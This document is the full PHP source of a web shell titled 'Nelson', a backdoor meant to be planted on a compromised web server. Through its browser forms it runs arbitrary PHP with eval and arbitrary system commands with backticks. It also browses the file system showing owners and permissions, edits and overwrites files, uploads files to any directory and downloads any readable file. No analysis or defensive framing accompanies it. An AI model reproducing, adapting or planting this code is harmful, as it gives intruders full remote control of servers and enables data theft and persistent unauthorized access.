<?
error_reporting(E_ALL);
@set_time_limit(0);
function magic_q($s)
{
if(get_magic_quotes_gpc())
{
$s=str_replace('\\\'','\'',$s);
$s=str_replace('\\\\','\\',$s);
$s=str_replace('\\"','"',$s);
$s=str_replace('\\\0','\0',$s);
}
return $s;
}
function get_perms($fn)
{
$mode=fileperms($fn);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
$head=<<<headka
<html>
<head>
<title>Nelson</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
</head>
<body link=palegreen vlink=palegreen text=palegreen bgcolor=black>
<style>
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
</style>
headka;
$page=isset($_POST['page'])?$_POST['page']:(isset($_SERVER['QUERY_STRING'])?$_SERVER['QUERY_STRING']:'');
$page=$page==''||($page!='cmd'&&$page!='eval')?'cmd':$page;
$winda=strpos(strtolower(php_uname()),'wind');
define('format',50);
$pages='<center>[<a href=\''.basename(__FILE__).'\'>cmd</a>] [<a href=\''.basename(__FILE__).'?eval\'>eval</a>]</center>'.($winda===false?'id :'.`id`:'');
switch($page)
{
case 'eval':
{
$eval_value=isset($_POST['eval_value'])?$_POST['eval_value']:'';
$eval_value=magic_q($eval_value);
$action=isset($_POST['action'])?$_POST['action']:'eval';
if($action=='eval_in_html') @eval($eval_value);
else
{
echo($head.$pages);
?>
<hr>
<form method=post>
<textarea cols=100 rows=20 name='eval_value'><?@eval($eval_value);?></textarea>
<input name='action' value='eval' type='submit'>
<input name='action' value='eval_in_html' type='submit'>
<input name='page' value='eval' type=hidden>
</form>
<hr>
<?
}
break;
}
case 'cmd':
{
$cmd=!empty($_POST['cmd'])?magic_q($_POST['cmd']):'';
$work_dir=isset($_POST['work_dir'])?$_POST['work_dir']:getcwd();
$action=isset($_POST['action'])?$_POST['action']:'cmd';
if(@is_dir($work_dir))
{
@chdir($work_dir);
$work_dir=getcwd();
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
}
else if(file_exists($work_dir))$work_dir=realpath($work_dir);
$work_dir=str_replace('\\','/',$work_dir);
$e_work_dir=htmlspecialchars($work_dir,ENT_QUOTES);
switch($action)
{
case 'cmd' :
{
echo($head.$pages);
?>
<form method='post' name='main_form'>
<input name='work_dir' value='<?=$e_work_dir?>' type=text size=100>
<input name='page' value='cmd' type=hidden>
<input type=submit value='Go!'>
</form>
<form method=post>
<input name='cmd' type=text size=100 value='<?=str_replace('\'','&#039;',$cmd)?>'>
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='cmd' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<form method=post enctype="multipart/form-data">
<input type="file" name="filename" size=50 >
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='upload' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<form method=post>
<input name='fname' type=text size=30><br>
<input name='archive' type=radio value='none'>without arch
<input name='archive' type=radio value='gzip' checked=true>gzip arch
<input name='work_dir'type=hidden>
<input name='page' value='cmd' type=hidden>
<input name='action' value='download' type=submit onclick="work_dir.value=document.main_form.work_dir.value;">
</form>
<pre>
<?
if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd)."</strong><hr>\n<textarea cols=120 rows=20>\n".htmlspecialchars(`$cmd`)."\n</textarea>");}
else
{
$f_action=isset($_POST['f_action'])?$_POST['f_action']:'view';
if(@is_dir($work_dir))
{
echo('<strong>Path :'.$e_work_dir.'</strong><hr>');
$handle=@opendir($work_dir);
if($handle)
{
while(false!==($fn=readdir($handle))){$files[]=$fn;};
@closedir($handle);
sort($files);
$not_dirs=array();
for($i=0;$i<sizeof($files);$i++)
{
$fn=$files[$i];
if(is_dir($fn))
{
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.$e_work_dir.str_replace('"','&quot;',$fn).'";document.list.submit();\'><b>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</b></a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
else {$not_dirs[]=$fn;}
}
for($i=0;$i<sizeof($not_dirs);$i++)
{
$fn=$not_dirs[$i];
echo('<a href=\'#\' onclick=\'document.list.work_dir.value="'.(is_link($work_dir.$fn)?$e_work_dir.readlink($work_dir.$fn):$e_work_dir.str_replace('"','&quot;',$fn)).'";document.list.submit();\'>'.htmlspecialchars(strlen($fn)>format?substr($fn,0,format-3).'...':$fn).'</a>'.str_repeat(' ',format-strlen($fn)));
if($winda===false)
{
$owner=@posix_getpwuid(@fileowner($work_dir.$fn));
$group=@posix_getgrgid(@filegroup($work_dir.$fn));
printf("% 20s|% -20s",$owner['name'],$group['name']);
}
echo(@get_perms($work_dir.$fn).str_repeat(' ',10));
printf("% 20s ",@filesize($work_dir.$fn).'B');
printf("% -20s",@date('M d Y H:i:s',@filemtime($work_dir.$fn))."\n");
}
echo('</pre><hr>');
?>
<form name='list' method=post>
<input name='work_dir' type=hidden size=100><br>
<input name='page' value='cmd' type=hidden>
<input name='f_action' value='view' type=hidden>
</form>
<?
} else echo('Error Listing '.$e_work_dir);
}
else
switch($f_action)
{
case 'view':
{
echo('<strong>'.$e_work_dir." Edit</strong><hr><pre>\n");
$f=@fopen($work_dir,'r');
?>
<form method=post>
<textarea name='file_text' cols=100 rows=20><?if(!($f))echo($e_work_dir.' not exists');else while(!feof($f))echo htmlspecialchars(fread($f,100000))?></textarea>
<input name='page' value='cmd' type=hidden>
<input name='work_dir' type=hidden value='<?=$e_work_dir?>' size=120>
<input name='f_action' value='save' type=submit>
</form>
<?
break;
}
case 'save' :
{
$file_text=isset($_POST['file_text'])?magic_q($_POST['file_text']):'';
$f=@fopen($work_dir,'w');
if(!($f))echo('<strong>Error '.$e_work_dir."</strong><hr><pre>\n");
else
{
fwrite($f,$file_text);
fclose($f);
echo('<strong>'.$e_work_dir." is saving</strong><hr><pre>\n");
}
break;
}
}
break;
}
break;
}
case 'upload' :
{
if($work_dir=='')$work_dir='/';
else if(!($work_dir{strlen($work_dir)-1}=='/'||$work_dir{strlen($work_dir)-1}=='\\')) $work_dir.='/';
$f=$_FILES["filename"]["name"];
if(!@copy($_FILES["filename"]["tmp_name"], $work_dir.$f)) echo('Upload is failed');
else
{
echo('file is uploaded in '.$e_work_dir);
}
break;
}
case 'download' :
{
$fname=isset($_POST['fname'])?$_POST['fname']:'';
$temp_file=isset($_POST['temp_file'])?'on':'nn';
$f=@fopen($fname,'r');
if(!($f)) echo('file is not exists');
else
{
$archive=isset($_POST['archive'])?$_POST['archive']:'';
if($archive=='gzip')
{
Header("Content-Type:application/x-gzip\n");
$s=gzencode(fread($f,filesize($fname)));
Header('Content-Length: '.strlen($s)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname).".gz\n\n");
echo($s);
}
else
{
Header("Content-Type:application/octet-stream\n");
Header('Content-Length: '.filesize($fname)."\n");
Header('Content-Disposition: attachment; filename="'.str_replace('/','-',$fname)."\n\n");
ob_start();
while(feof($f)===false)
{
echo(fread($f,10000));
ob_flush();
}
}
}
}
}
break;
}
}
?>